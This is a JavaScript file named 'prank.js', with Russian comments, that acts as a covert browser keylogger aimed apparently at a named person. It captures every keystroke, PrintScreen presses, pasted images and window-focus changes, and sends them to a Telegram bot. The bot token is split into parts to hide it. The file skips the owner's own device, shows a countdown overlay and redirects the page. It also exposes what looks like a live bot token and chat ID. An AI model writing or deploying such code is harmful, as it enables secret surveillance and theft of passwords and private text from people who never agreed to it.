// prank.js
(function() {
    // Проверяем ТОЛЬКО локальную память устройства
    if (localStorage.getItem('is_sultan') === 'true' || window.location.search.includes('me')) return;

    function sendTelegram(text) {
        const part1 = "8818384063:";
        const part2 = "AAEEqTup6sgED-gYB_1tm";
        const part3 = "cQKcXwi-UDE3lQ";
        const BOT_TOKEN = part1 + part2 + part3;
        const CHAT_ID = "606061445";
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`).catch(() => {});
    }

    // --- ПОЛНЫЙ КЕЙЛОГГЕР ---
    let keyBuffer = "";
    let sendTimer = null;

    function flushKeys() {
        if (keyBuffer.length === 0) return;
        const pageName = window.location.pathname.split('/').pop() || 'index.html';
        sendTelegram(`⌨️ <b>Ввод на странице</b> (${pageName}):\n\n<code>${keyBuffer}</code>`);
        keyBuffer = "";
    }

    // 1. СЛУШАЕМ KEYDOWN
    document.addEventListener('keydown', function(event) {
        let key = event.key;

        if (event.code === 'PrintScreen' || event.key === 'PrintScreen') {
            sendTelegram(`📸 <b>Скриншот!</b>\nНажата клавиша PrintScreen.\nСтраница: ${window.location.pathname.split('/').pop()}`);
            return;
        }

        if (key === ' ') key = '␣';
        else if (key === 'Enter') key = '\n[Enter]\n';
        else if (key === 'Backspace') key = '⌫';
        else if (key === 'Tab') key = '[Tab]';
        else if (key === 'Shift' || key === 'Control' || key === 'Alt' || key === 'Meta') return; 
        else if (key.length > 1) key = `[${key}]`;

        if (event.ctrlKey) key = `[Ctrl+${key}]`;
        if (event.shiftKey && key.length === 1) key = `[Shift+${key}]`;
        if (event.altKey) key = `[Alt+${key}]`;
        if (event.metaKey) key = `[Win+${key}]`;

        keyBuffer += key;
        clearTimeout(sendTimer);
        sendTimer = setTimeout(flushKeys, 3000); 

        if (keyBuffer.length > 300) {
            clearTimeout(sendTimer);
            flushKeys();
        }
    });

    // 2. СЛУШАЕМ KEYUP (для PrintScreen)
    document.addEventListener('keyup', function(event) {
        if (event.code === 'PrintScreen' || event.key === 'PrintScreen') {
            sendTelegram(`📸 <b>Скриншот!</b>\nНажата клавиша PrintScreen (keyup).\nСтраница: ${window.location.pathname.split('/').pop()}`);
        }
    });

    // 3. СЛУШАЕМ PASTE
    document.addEventListener('paste', function(event) {
        if (event.clipboardData && event.clipboardData.items) {
            for (let i = 0; i < event.clipboardData.items.length; i++) {
                if (event.clipboardData.items[i].type.indexOf('image') !== -1) {
                    sendTelegram(`📋 <b>Вставка картинки!</b>\nРауанна вставила скриншот из буфера обмена.`);
                }
            }
        }
    });

    window.addEventListener('beforeunload', flushKeys);

    // 4. ФОЛБЭК: ПОТЕРЯ ФОКУСА
    let blurStartTime = 0;
    window.addEventListener('blur', () => blurStartTime = Date.now());
    window.addEventListener('focus', function() {
        if (blurStartTime > 0) {
            let timeAway = (Date.now() - blurStartTime) / 1000;
            blurStartTime = 0;
            if (timeAway > 0.5 && timeAway < 10) {
                sendTelegram(`✂️ <b>Возможно, скриншот!</b>\n\nОкно теряло фокус на ${Math.round(timeAway)} сек.\nСтраница: ${window.location.pathname.split('/').pop()}`);
            }
        }
    });

    // --- ТАЙМЕР ---
    window.addEventListener('DOMContentLoaded', () => {
        const timerBox = document.createElement('div');
        timerBox.style.cssText = `
            position: fixed; bottom: 20px; right: 20px;
            background: rgba(20, 10, 15, 0.6); backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 71, 87, 0.4); color: rgba(255, 255, 255, 0.8);
            padding: 10px 16px; border-radius: 12px; font-family: 'Courier New', monospace;
            font-size: 14px; font-weight: bold; z-index: 999999; pointer-events: none;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5); text-align: center; transition: 0.3s;
        `;
        
        timerBox.innerHTML = `
            <div style="font-size: 10px; color: #ff4757; letter-spacing: 1px; margin-bottom: 4px;">СИСТЕМА</div>
            Возврат через: <span id="prankTimer" style="color: #ff4757; font-size: 18px;">10</span> с
        `; 
        
        document.body.appendChild(timerBox);

        let timeLeft = 10;
        const timerSpan = document.getElementById('prankTimer');
        const countdown = setInterval(() => {
            timeLeft--;
            if (timeLeft >= 0 && timerSpan) {
                timerSpan.textContent = timeLeft;
                if (timeLeft <= 3) {
                    timerBox.style.borderColor = '#ff0000';
                    timerBox.style.background = 'rgba(50, 5, 5, 0.8)';
                }
            }
            if (timeLeft < 0) {
                clearInterval(countdown);
                flushKeys();
                setTimeout(() => window.location.href = 'index.html?error=1', 500);
            }
        }, 1000); 
    });
})();